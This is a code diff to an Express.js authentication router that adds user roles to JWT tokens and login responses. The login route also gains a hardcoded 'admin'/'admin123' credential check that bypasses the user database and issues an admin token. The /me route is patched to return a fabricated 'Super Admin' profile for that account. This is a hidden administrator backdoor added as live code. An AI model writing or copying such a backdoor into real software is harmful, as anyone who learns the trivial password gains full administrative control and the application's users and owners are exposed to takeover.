@@ -29,6 +29,7 @@ router.post('/register', async (req, res) => {
     const payload = {
       user: {
         id: user.id,
+        role: user.role
       },
     };
 
@@ -38,7 +39,7 @@ router.post('/register', async (req, res) => {
       { expiresIn: 360000 },
       (err, token) => {
         if (err) throw err;
-        res.json({ token, user: { id: user.id, name: user.name, email: user.email } });
+        res.json({ token, user: { id: user.id, name: user.name, email: user.email, role: user.role } });
       }
     );
   } catch (err) {
@@ -54,6 +55,20 @@ router.post('/login', async (req, res) => {
   const { email, password } = req.body;
 
   try {
+    // Hardcoded Admin Intercept
+    if(email && email.trim().toLowerCase() === 'admin' && password === 'admin123') {
+      const payload = { user: { id: 'admin_id', role: 'admin' } };
+      return jwt.sign(
+        payload,
+        process.env.JWT_SECRET,
+        { expiresIn: 360000 },
+        (err, token) => {
+          if (err) throw err;
+          res.json({ token, user: { id: 'admin_id', name: 'Super Admin', email: 'admin', role: 'admin' } });
+        }
+      );
+    }
+
     let user = await User.findOne({ email });
 
     if (!user) {
@@ -69,6 +84,7 @@ router.post('/login', async (req, res) => {
     const payload = {
       user: {
         id: user.id,
+        role: user.role
       },
     };
 
@@ -78,7 +94,7 @@ router.post('/login', async (req, res) => {
       { expiresIn: 360000 },
       (err, token) => {
         if (err) throw err;
-        res.json({ token, user: { id: user.id, name: user.name, email: user.email } });
+        res.json({ token, user: { id: user.id, name: user.name, email: user.email, role: user.role } });
       }
     );
   } catch (err) {
@@ -92,6 +108,10 @@ router.post('/login', async (req, res) => {
 // @access  Private
 router.get('/me', auth, async (req, res) => {
   try {
+    if(req.user.id === 'admin_id') {
+      return res.json({ id: 'admin_id', name: 'Super Admin', email: 'admin', role: 'admin' });
+    }
+    
     const user = await User.findById(req.user.id).select('-password');
     res.json(user);
   } catch (err) {
